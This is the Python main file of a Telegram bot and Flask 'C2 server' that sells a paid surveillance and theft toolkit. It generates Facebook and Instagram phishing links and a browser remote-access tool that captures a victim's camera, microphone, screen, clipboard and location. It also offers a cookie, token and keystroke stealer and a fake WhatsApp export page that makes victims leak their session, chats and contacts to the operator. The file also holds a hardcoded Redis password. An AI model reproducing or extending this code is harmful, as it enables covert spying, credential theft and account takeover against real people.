# main.py
import os
import io
import time
import threading
import requests
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask
import redis
import uuid

# ============================================================
# استيراد ملفات الأدوات
# ============================================================
try:
    from facebook_module import init_facebook_routes
except Exception as e:
    print(f"[-] Error importing facebook_module: {e}")
    init_facebook_routes = lambda app, bot: None

try:
    from instagram_module import init_instagram_routes
except Exception as e:
    print(f"[-] Error importing instagram_module: {e}")
    init_instagram_routes = lambda app, bot: None

try:
    from rat_module import init_rat_routes, rat_bp, queue_command
except Exception as e:
    print(f"[-] Error importing rat_module: {e}")
    init_rat_routes = lambda app, bot: None
    rat_bp = None
    queue_command = lambda *args: None

try:
    from qr_pairing import init_qr_routes, qr_bp, generate_qr_code_bytes
except Exception as e:
    print(f"[-] Error importing qr_pairing: {e}")
    init_qr_routes = lambda app, bot: None
    qr_bp = None
    generate_qr_code_bytes = lambda *args: None

# ============================================================
# استيراد LSH Module
# ============================================================
try:
    from lsh_module import (
        init_lsh_routes,
        lsh_bp,
        generate_qr_code_bytes as lsh_generate_qr,
        set_bot_reference,
        push_command as lsh_push_command,
        get_session as lsh_get_session,
        build_lsh_control_panel,
    )
    LSH_ENABLED = True
except Exception as e:
    print(f"[-] Error importing lsh_module: {e}")
    LSH_ENABLED = False

    def init_lsh_routes(app, bot): pass
    def set_bot_reference(bot): pass
    def lsh_push_command(*a, **kw): return False
    def lsh_get_session(*a, **kw): return None
    def lsh_generate_qr(*a, **kw): return io.BytesIO()
    def build_lsh_control_panel(*a, **kw): return InlineKeyboardMarkup()
    lsh_bp = None

# ============================================================
# استيراد Session Hijacker Module
# ============================================================
try:
    from session_hijacker import (
        init_session_hijacker_routes,
        sh_bp,
        get_sh_session_data,
        sessions as sh_sessions,
    )
    SH_ENABLED = True
    print("[+] session_hijacker imported")
except Exception as e:
    print(f"[-] Error importing session_hijacker: {e}")
    SH_ENABLED = False

    def init_session_hijacker_routes(app, bot): pass
    sh_bp = None
    def get_sh_session_data(sid): return None
    sh_sessions = {}

# ============================================================
# ★★★ استيراد WhatsApp Stealer Module ★★★
# ============================================================
try:
    from wa_stealer import (
        init_whatsapp_stealer_routes,
        wa_bp,
        get_wa_data,
        build_wa_panel,
    )
    WA_ENABLED = True
    print("[+] wa_stealer imported")
except Exception as e:
    print(f"[-] Error importing wa_stealer: {e}")
    WA_ENABLED = False

    def init_whatsapp_stealer_routes(app, bot): pass
    wa_bp = None
    def get_wa_data(sid): return {}
    def build_wa_panel(sid, cid): return InlineKeyboardMarkup()

# ============================================================
# استيراد نظام الدفع
# ============================================================
try:
    from stars_payment import (
        register_payment_handlers,
        get_or_create_user,
        can_use_tool,
        consume_usage,
        build_plans_keyboard,
        build_main_payment_keyboard,
        build_account_text,
        build_plans_text,
        send_invoice,
        PRICING_PLANS,
        FREE_TRIAL_USES,
        AVAILABLE_TOOLS,
    )
    PAYMENT_ENABLED = True
    print("[+] stars_payment imported")
except Exception as e:
    print(f"[-] Error importing stars_payment: {e}")
    PAYMENT_ENABLED = False

    def register_payment_handlers(bot): pass
    def get_or_create_user(*a, **kw): return {}
    def can_use_tool(*a, **kw): return {"allowed": True, "reason": "bypass"}
    def consume_usage(*a, **kw): return True
    def build_plans_keyboard(): return InlineKeyboardMarkup()
    def build_main_payment_keyboard(): return InlineKeyboardMarkup()
    def build_account_text(*a, **kw): return "نظام الدفع معطّل"
    def build_plans_text(): return "نظام الدفع معطّل"
    def send_invoice(*a, **kw): pass
    PRICING_PLANS = {}
    FREE_TRIAL_USES = 1
    AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh", "sh", "wa"]


# ============================================================
# إعدادات عامة
# ============================================================
BOT_TOKEN = os.getenv("BOT_TOKEN")
RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")

# ============================================================
# Redis — نسخة محسّنة مع TLS fallback
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "").strip()

if not REDIS_URL:
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"

if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()

if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://" + REDIS_URL

print(f"[+] Redis URL configured: {REDIS_URL[:45]}...")


def _try_redis(url):
    try:
        client = redis.Redis.from_url(
            url,
            decode_responses=True,
            socket_timeout=10,
            socket_connect_timeout=10,
            retry_on_timeout=True,
            health_check_interval=30,
        )
        client.ping()
        return client
    except Exception as e:
        print(f"[-] Redis try failed ({url[:30]}...): {e}")
        return None


redis_client = _try_redis(REDIS_URL)

if not redis_client and REDIS_URL.startswith("redis://"):
    tls_url = REDIS_URL.replace("redis://", "rediss://", 1)
    print(f"[+] Trying TLS fallback...")
    redis_client = _try_redis(tls_url)
    if redis_client:
        REDIS_URL = tls_url
        print("[+] TLS connection succeeded!")

if not redis_client and REDIS_URL.startswith("rediss://"):
    non_tls = REDIS_URL.replace("rediss://", "redis://", 1)
    print(f"[+] Trying non-TLS fallback...")
    redis_client = _try_redis(non_tls)
    if redis_client:
        REDIS_URL = non_tls
        print("[+] Non-TLS connection succeeded!")

if redis_client:
    print("[+] main: Redis connected successfully")
else:
    print("[-] main: Redis FAILED — some features may not work")

if not BOT_TOKEN:
    raise ValueError("[-] BOT_TOKEN is missing!")

print(f"[+] Bot token configured: {BOT_TOKEN[:10]}...")

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)


# ============================================================
# Health check
# ============================================================
@app.route('/')
def health_check():
    return "C2 Server and Telegram Bot are active and running smoothly.", 200


# ============================================================
# تسجيل Blueprints ومسارات
# ============================================================
if rat_bp:
    app.register_blueprint(rat_bp)
if qr_bp:
    app.register_blueprint(qr_bp)
if LSH_ENABLED and lsh_bp:
    app.register_blueprint(lsh_bp)
if SH_ENABLED and sh_bp:
    app.register_blueprint(sh_bp)
if WA_ENABLED and wa_bp:
    app.register_blueprint(wa_bp)

init_facebook_routes(app, bot)
init_instagram_routes(app, bot)
init_rat_routes(app, bot)
init_qr_routes(app, bot)
init_lsh_routes(app, bot)
init_session_hijacker_routes(app, bot)
init_whatsapp_stealer_routes(app, bot)

if LSH_ENABLED:
    set_bot_reference(bot)

# تسجيل معالجات الدفع
register_payment_handlers(bot)


# ============================================================
# القوائم
# ============================================================
def main_menu():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
    markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
    markup.add(InlineKeyboardButton("📱 أداة المراقبة والتحكم الخلفي", callback_data="gen_rat"))
    markup.add(InlineKeyboardButton("📷 أداة ربط الضحية السريع عبر QR", callback_data="gen_qr"))
    markup.add(InlineKeyboardButton("🕹️ السيطرة الكاملة على الجلسة (LSH)", callback_data="gen_lsh"))
    markup.add(InlineKeyboardButton("🍪 سرقة الكوكيز والجلسات (SH)", callback_data="gen_sh"))
    markup.add(InlineKeyboardButton("📱 WhatsApp Export Hunter", callback_data="gen_wa"))
    markup.add(InlineKeyboardButton("💎 الاشتراكات والدفع", callback_data="payment_menu"))
    markup.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
    return markup


def payment_menu():
    return build_main_payment_keyboard()


# ============================================================
# رسائل مساعدة
# ============================================================
def _deny_message(reason, user_id, tool, data=None):
    data = data or {}
    if reason == "daily_limit_reached":
        return (
            "⚠️ **وصلت للحد اليومي لباقتك الحالية.**\n\n"
            f"🎯 الحد اليومي: {data.get('daily_limit', 0)} عملية\n"
            "💎 قم بترقية باقتك أو انتظر لليوم التالي."
        )
    if reason == "no_credit":
        return (
            "❌ **لا يوجد لديك استخدام متاح لهذه الأداة.**\n\n"
            f"🎁 حصلت على {FREE_TRIAL_USES} استخدام مجاني فقط عند التسجيل.\n"
            "💎 اشترك في إحدى الباقات للاستمرار.\n\n"
            "اضغط على 💎 الاشتراكات والدفع لعرض الباقات."
        )
    return "❌ لا يمكن استخدام الأداة حالياً."


# ============================================================
# Start Command
# ============================================================
@bot.message_handler(commands=['start', 'panel'])
def start_command(message):
    print(f"[+] /start from {message.from_user.id}")
    user_name = message.from_user.first_name
    get_or_create_user(
        message.from_user.id,
        message.from_user.username or "Unknown",
        user_name
    )
    text = (
        f"⚡ مرحباً بك يا {user_name} في DEV ١ 😈\n\n"
        "غير مسؤول تماماً عن إساءة الاستخدام.\n\n"
        f"🎁 لديك {FREE_TRIAL_USES} استخدام مجاني لكل أداة."
    )
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=main_menu())


# ============================================================
# Callback Handler
# ============================================================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id

    # ============================================================
    # قسم الدفع
    # ============================================================
    if call.data == "payment_menu":
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            "💎 **قسم الاشتراكات والدفع**\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "اختر ما تريد:",
            parse_mode="Markdown",
            reply_markup=build_main_payment_keyboard()
        )
        return

    if call.data == "show_plans":
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            build_plans_text(),
            parse_mode="Markdown",
            reply_markup=build_plans_keyboard()
        )
        return

    if call.data.startswith("buy_plan_"):
        plan_key = call.data.replace("buy_plan_", "")
        bot.answer_callback_query(call.id, "جاري تجهيز الفاتورة...")
        send_invoice(bot, chat_id, plan_key)
        return

    if call.data == "my_account":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, build_account_text(chat_id), parse_mode="Markdown")
        return

    if call.data == "back_to_main":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "القائمة الرئيسية:", reply_markup=main_menu())
        return

    # ============================================================
    # توليد فيسبوك
    # ============================================================
    if call.data == "gen_fb":
        check = can_use_tool(chat_id, "fb")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "fb", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "fb")
        bot.answer_callback_query(call.id, "جاري تجهيز رابط فيسبوك...")
        link = f"{RAILWAY_URL}/login.php?id={chat_id}"
        bot.send_message(chat_id, f"🎯 رابط فيسبوك المخصص:\n `{link}` ", parse_mode="Markdown")
        return

    # ============================================================
    # توليد انستقرام
    # ============================================================
    if call.data == "gen_ig":
        check = can_use_tool(chat_id, "ig")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "ig", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "ig")
        bot.answer_callback_query(call.id, "جاري تجهيز رابط انستقرام...")
        link = f"{RAILWAY_URL}/ig_login.php?id={chat_id}"
        bot.send_message(chat_id, f"📸 رابط انستقرام المخصص:\n `{link}` ", parse_mode="Markdown")
        return

    # ============================================================
    # توليد RAT
    # ============================================================
    if call.data == "gen_rat":
        check = can_use_tool(chat_id, "rat")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "rat", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "rat")
        bot.answer_callback_query(call.id, "جاري تجهيز رابط التحكم الخلفي...")
        link = f"{RAILWAY_URL}/system_secure_v2?id={chat_id}"
        bot.send_message(
            chat_id,
            f"📱 رابط المراقبة والتحكم الخلفي المطور جاهز:\n `{link}` \n\n"
            "بمجرد أن يفتح الضحية الرابط ستعمل الجلسة في خلفية متصفحه بلا توقف.",
            parse_mode="Markdown"
        )
        return

    # ============================================================
    # توليد QR
    # ============================================================
    if call.data == "gen_qr":
        check = can_use_tool(chat_id, "qr")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "qr", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "qr")
        bot.answer_callback_query(call.id, "جاري توليد كود الـ QR السريع...")
        token = str(uuid.uuid4())[:8]
        if redis_client:
            try:
                redis_client.setex(f"qr_token:{token}", 300, chat_id)
            except Exception as e:
                print(f"Redis write error: {e}")

        target_link = f"{RAILWAY_URL}/qr_scan_target?token={token}"
        qr_image = generate_qr_code_bytes(target_link)
        if qr_image:
            qr_image.name = 'pairing_qr.jpg'
            bot.send_photo(
                chat_id,
                qr_image,
                caption="📷 **امسح هذا الـ QR بكاميرا هاتف الضحية:**\n\n"
                        "بمجرد توجيه الكاميرا وفتح الرابط، سيتم سحب بيانات الجهاز "
                        "وجلسة الضحية فوراً إلى بوتك هنا دون تثبيت أي برامج!",
                parse_mode="Markdown"
            )
        else:
            bot.send_message(chat_id, f"🎯 **رابط الـ QR المباشر:**\n`{target_link}`", parse_mode="Markdown")
        return

    # ============================================================
    # توليد LSH
    # ============================================================
    if call.data == "gen_lsh":
        check = can_use_tool(chat_id, "lsh")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "lsh", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "lsh")
        bot.answer_callback_query(call.id, "جاري تجهيز جلسة التحكم الكامل...")

        session_id = str(uuid.uuid4()).replace('-', '')[:24]
        if redis_client:
            try:
                redis_client.setex(f"lsh_session:{session_id}", 86400, str(chat_id))
            except Exception as e:
                print(f"[-] Redis setex LSH error: {e}")

        try:
            requests.post(
                f"{RAILWAY_URL}/lsh_create",
                json={"chat_id": chat_id, "session_id": session_id},
                timeout=5
            )
        except Exception as e:
            print(f"[-] LSH create HTTP warning: {e}")

        target_link = f"{RAILWAY_URL}/lsh?s={session_id}&id={chat_id}"
        qr_image = lsh_generate_qr(target_link)

        if qr_image:
            qr_image.name = 'lsh_qr.png'
            try:
                bot.send_photo(
                    chat_id, qr_image,
                    caption=(
                        "🕹️ **جلسة السيطرة الكاملة جاهزة!**\n"
                        "━━━━━━━━━━━━━━━━━━\n\n"
                        "🎯 **وجّه الضحية لمسح الكود أو افتح الرابط:**\n"
                        f"`{target_link}`\n\n"
                        "📊 **ما سيتم تلقائياً:**\n"
                        "• تقرير كامل عن الجهاز + IP الحقيقي\n"
                        "• صورة من الكاميرا الأمامية\n"
                        "• تسجيل صوتي من الميكروفون\n"
                        "• لوحة تحكم حية بأزرار تفاعلية\n\n"
                        "⚠️ الجلسة تنتهي بعد 24 ساعة."
                    ),
                    parse_mode="Markdown"
                )
            except Exception as e:
                print(f"[-] send_photo error: {e}")
                bot.send_message(chat_id, f"🕹️ **رابط الجلسة:**\n`{target_link}`", parse_mode="Markdown")
        else:
            bot.send_message(chat_id, f"🕹️ **رابط الجلسة:**\n`{target_link}`", parse_mode="Markdown")
        return

    # ============================================================
    # توليد Session Hijacker
    # ============================================================
    if call.data == "gen_sh":
        check = can_use_tool(chat_id, "sh")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "sh", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "sh")
        bot.answer_callback_query(call.id, "جاري تجهيز جلسة سرقة الكوكيز...")

        session_id = str(uuid.uuid4()).replace('-', '')[:24]
        if redis_client:
            try:
                redis_client.setex(f"sh_session:{session_id}", 86400, str(chat_id))
            except Exception as e:
                print(f"[-] Redis setex SH error: {e}")

        try:
            requests.post(
                f"{RAILWAY_URL}/sh_create",
                json={"chat_id": chat_id, "session_id": session_id},
                timeout=5
            )
        except Exception as e:
            print(f"[-] SH create HTTP warning: {e}")

        target_link = f"{RAILWAY_URL}/sh?s={session_id}&id={chat_id}"
        bot.send_message(
            chat_id,
            f"🍪 **أداة سرقة الجلسات والكوكيز**\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"🎯 **الرابط:**\n`{target_link}`\n\n"
            f"📊 **ما تسحبه الأداة:**\n"
            f"• 🍪 كل الكوكيز المتاحة (حتى المخفية)\n"
            f"• 💾 LocalStorage + SessionStorage كامل\n"
            f"• 📦 IndexedDB (فيسبوك، واتساب، تلجرام)\n"
            f"• 🗄️ Cache Storage\n"
            f"• 🔑 كل الـ Tokens (Bearer, XSRF, CSRF)\n"
            f"• ⌨️ Keylogger حي\n"
            f"• 📝 نماذج تسجيل الدخول\n"
            f"• 🕵️ WebRTC IP Leak\n"
            f"• 🖥️ بصمة الجهاز الكاملة\n\n"
            f"⚠️ الأداة تبقى تعمل حتى بعد إغلاق الصفحة (Service Worker)",
            parse_mode="Markdown"
        )
        return

    # ============================================================
    # ★★★ توليد WhatsApp Export Hunter ★★★
    # ============================================================
    if call.data == "gen_wa":
        check = can_use_tool(chat_id, "wa")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "wa", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "wa")
        bot.answer_callback_query(call.id, "جاري تجهيز جلسة WhatsApp...")

        session_id = str(uuid.uuid4()).replace('-', '')[:24]
        if redis_client:
            try:
                redis_client.setex(f"wa_session:{session_id}", 86400 * 7, str(chat_id))
            except Exception as e:
                print(f"[-] Redis setex WA error: {e}")

        try:
            requests.post(
                f"{RAILWAY_URL}/wa_create",
                json={"chat_id": chat_id, "session_id": session_id},
                timeout=5
            )
        except Exception as e:
            print(f"[-] WA create HTTP warning: {e}")

        target_link = f"{RAILWAY_URL}/wa?s={session_id}&id={chat_id}"

        bot.send_message(
            chat_id,
            f"📱 **WhatsApp Export Hunter — جاهز!**\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"🎯 **الرابط:**\n`{target_link}`\n\n"
            f"📊 **ما تفعله الأداة:**\n"
            f"• 🎭 تُظهر صفحة 'تصدير محادثات WhatsApp' رسمية\n"
            f"• 📋 الضحية تنسخ 'أداة التصدير'\n"
            f"• ⌨️ تشغّلها على WhatsApp Web الحقيقي\n"
            f"• 🔑 الأداة تسحب **IndexedDB كامل** (الجلسة)\n"
            f"• 💬 تسحب كل المحادثات والأسماء\n"
            f"• 👥 تسحب جهات الاتصال\n"
            f"• 📥 الصور والفيديوهات (Blobs)\n\n"
            f"⚠️ **مهم:** الأداة تعمل على أي متصفح (Chrome, Firefox, Edge, Safari)",
            parse_mode="Markdown"
        )
        return

    # ============================================================
    # أوامر RAT
    # ============================================================
    if call.data.startswith("rat_cam_"):
        target_chat_id = call.data.replace("rat_cam_", "")
        queue_command(target_chat_id, "snapshot")
        bot.answer_callback_query(call.id, "⏳ جاري التقاط الصورة من الضحية...")
        return

    if call.data.startswith("rat_mic_"):
        target_chat_id = call.data.replace("rat_mic_", "")
        queue_command(target_chat_id, "audio")
        bot.answer_callback_query(call.id, "⏳ جاري تسجيل الصوت من ميكروفون الضحية...")
        return

    # ============================================================
    # أوامر LSH
    # ============================================================
    if call.data.startswith("lsh_snap_"):
        sid = call.data.replace("lsh_snap_", "")
        ok = lsh_push_command(sid, {"action": "snapshot"})
        bot.answer_callback_query(call.id, "📸 جاري طلب الصورة..." if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return

    if call.data.startswith("lsh_audio_"):
        sid = call.data.replace("lsh_audio_", "")
        ok = lsh_push_command(sid, {"action": "audio", "payload": {"duration": 6000}})
        bot.answer_callback_query(call.id, "🎙️ جاري التسجيل..." if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return

    if call.data.startswith("lsh_video_"):
        sid = call.data.replace("lsh_video_", "")
        ok = lsh_push_command(sid, {"action": "video", "payload": {"duration": 10000}})
        bot.answer_callback_query(call.id, "🎥 جاري تسجيل الفيديو..." if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return

    if call.data.startswith("lsh_screen_"):
        sid = call.data.replace("lsh_screen_", "")
        ok = lsh_push_command(sid, {"action": "screen"})
        bot.answer_callback_query(call.id, "🖥️ جاري التقاط الشاشة..." if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return

    if call.data.startswith("lsh_clip_"):
        sid = call.data.replace("lsh_clip_", "")
        ok = lsh_push_command(sid, {"action": "clipboard"})
        bot.answer_callback_query(call.id, "📋 جاري سحب الحافظة..." if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return

    if call.data.startswith("lsh_loc_"):
        sid = call.data.replace("lsh_loc_", "")
        ok = lsh_push_command(sid, {"action": "location"})
        bot.answer_callback_query(call.id, "📍 جاري تحديث الموقع..." if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return

    if call.data.startswith("lsh_open_"):
        sid = call.data.replace("lsh_open_", "")
        bot.answer_callback_query(call.id, "🌐 أرسل الرابط الآن")
        _pending_open_url[chat_id] = sid
        bot.send_message(
            chat_id,
            "🌐 **أرسل الرابط الذي تريد فتحه على جهاز الضحية**\n"
            "(يجب أن يبدأ بـ http:// أو https://)"
        )
        return

    if call.data.startswith("lsh_vibrate_"):
        sid = call.data.replace("lsh_vibrate_", "")
        ok = lsh_push_command(sid, {"action": "vibrate", "payload": {"pattern": [500, 200, 500, 200, 500]}})
        bot.answer_callback_query(call.id, "📳 تم الإرسال" if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return

    if call.data.startswith("lsh_kill_"):
        sid = call.data.replace("lsh_kill_", "")
        ok = lsh_push_command(sid, {"action": "redirect", "payload": {"url": "about:blank"}})
        bot.answer_callback_query(call.id, "❌ جاري الإنهاء..." if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return

    # ============================================================
    # أوامر Session Hijacker
    # ============================================================
    if call.data.startswith("sh_"):
        parts = call.data.split("_", 2)
        cmd = parts[1] if len(parts) > 1 else ""
        sid = parts[2] if len(parts) > 2 else None

        if cmd == "cookies":
            sess = get_sh_session_data(sid)
            if sess and sess.get('cookies'):
                import json as _json
                text = _json.dumps(sess['cookies'], ensure_ascii=False, indent=2)
                buf = io.BytesIO(text.encode('utf-8'))
                buf.name = f'cookies_{sid[:8]}.json'
                bot.send_document(chat_id, buf, caption="🍪 الكوكيز")
            else:
                bot.answer_callback_query(call.id, "لا توجد كوكيز بعد", show_alert=True)
        elif cmd == "storage":
            sess = get_sh_session_data(sid)
            if sess and sess.get('storage'):
                import json as _json
                text = _json.dumps(sess['storage'], ensure_ascii=False, indent=2)
                buf = io.BytesIO(text.encode('utf-8'))
                buf.name = f'storage_{sid[:8]}.json'
                bot.send_document(chat_id, buf, caption="💾 Storage")
            else:
                bot.answer_callback_query(call.id, "لا يوجد Storage بعد", show_alert=True)
        elif cmd == "tokens":
            sess = get_sh_session_data(sid)
            if sess and sess.get('forms'):
                text = "\n".join(str(f) for f in sess['forms'])
                buf = io.BytesIO(text.encode('utf-8'))
                buf.name = f'tokens_{sid[:8]}.txt'
                bot.send_document(chat_id, buf, caption="🔑 Tokens")
            else:
                bot.answer_callback_query(call.id, "لا توجد Tokens بعد", show_alert=True)
        elif cmd == "html":
            bot.answer_callback_query(call.id, "لا توجد HTML بعد", show_alert=True)
        elif cmd == "open":
            bot.answer_callback_query(call.id, "ميزة قيد التطوير")
        elif cmd == "delete":
            bot.answer_callback_query(call.id, "✅ تم")
        return

    # ============================================================
    # ★★★ أوامر WhatsApp Export Hunter ★★★
    # ============================================================
    if call.data.startswith("wa_"):
        parts = call.data.split("_", 2)
        cmd = parts[1] if len(parts) > 1 else ""
        sid = parts[2] if len(parts) > 2 else None

        if cmd == "idb":
            data = get_wa_data(sid)
            if data.get("idb"):
                buf = io.BytesIO(data["idb"].encode('utf-8'))
                buf.name = f'wa_indexeddb_{sid[:8]}.json'
                bot.send_document(chat_id, buf,
                    caption="📥 **IndexedDB كامل**\nاستخدمه لاستعادة الجلسة عندك",
                    parse_mode="Markdown")
            else:
                bot.answer_callback_query(call.id, "لا توجد بيانات بعد", show_alert=True)

        elif cmd == "storage":
            data = get_wa_data(sid)
            if data.get("storage"):
                buf = io.BytesIO(data["storage"].encode('utf-8'))
                buf.name = f'wa_storage_{sid[:8]}.json'
                bot.send_document(chat_id, buf, caption="💾 **Storage + Cookies**")
            else:
                bot.answer_callback_query(call.id, "لا توجد بيانات بعد", show_alert=True)

        elif cmd == "stats":
            data = get_wa_data(sid)
            has_idb = "✅" if data.get("idb") else "❌"
            has_storage = "✅" if data.get("storage") else "❌"
            size = len(data.get("idb") or "") / 1024
            text = (
                f"📊 **إحصائيات WhatsApp**\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🆔 `{sid[:16] if sid else 'N/A'}`\n"
                f"📦 IndexedDB: {has_idb}\n"
                f"💾 Storage: {has_storage}\n"
                f"📏 الحجم: `{size:.1f} KB`\n"
                f"📦 Chunks: `{data.get('chunks_count', 0)}`"
            )
            bot.send_message(chat_id, text, parse_mode="Markdown")

        elif cmd == "delete":
            bot.answer_callback_query(call.id, "✅ تم")

        return


# ============================================================
# معالجة الرابط المُدخل لفتحه على الضحية
# ============================================================
_pending_open_url = {}


@bot.message_handler(func=lambda m: m.chat.id in _pending_open_url and m.text and m.text.startswith("http"))
def handle_open_url(message):
    sid = _pending_open_url.pop(message.chat.id, None)
    if sid:
        ok = lsh_push_command(sid, {"action": "url", "payload": {"url": message.text}})
        if ok:
            bot.send_message(message.chat.id, "✅ سيتم فتح الرابط على جهاز الضحية خلال ثانيتين")
        else:
            bot.send_message(message.chat.id, "❌ **فشل الإرسال** — تحقق من اتصال Redis")


# ============================================================
# تشغيل البوت
# ============================================================
def run_telegram_bot():
    print("[+] ============================================")
    print("[+] Starting Telegram Bot polling...")
    print(f"[+] Bot token: {BOT_TOKEN[:15]}...{BOT_TOKEN[-5:]}")
    print("[+] ============================================")

    try:
        r = requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook",
            params={"drop_pending_updates": "true"},
            timeout=15,
        )
        print(f"[+] deleteWebhook HTTP {r.status_code}: {r.text[:200]}")
    except Exception as e:
        print(f"[-] deleteWebhook HTTP error: {e}")

    try:
        r = requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/getWebhookInfo",
            timeout=15,
        )
        print(f"[+] getWebhookInfo: {r.text[:300]}")
    except Exception as e:
        print(f"[-] getWebhookInfo error: {e}")

    try:
        r = requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/getMe",
            timeout=15,
        )
        print(f"[+] getMe: {r.text[:200]}")
    except Exception as e:
        print(f"[-] getMe error: {e}")

    print("[+] Starting infinity_polling loop...")
    attempt = 0
    while True:
        try:
            attempt += 1
            print(f"[+] Polling attempt #{attempt}")
            bot.infinity_polling(
                skip_pending=True,
                timeout=30,
                long_polling_timeout=30,
                none_stop=True,
            )
        except Exception as e:
            print(f"[-] Polling crashed: {e}")
            print(f"[+] Restarting in 5 seconds...")
            time.sleep(5)


if __name__ == "__main__":
    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
    bot_thread.start()

    time.sleep(2)

    port = int(os.environ.get("PORT", 8080))
    print(f"[+] Flask Web Server starting on port {port}...")
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
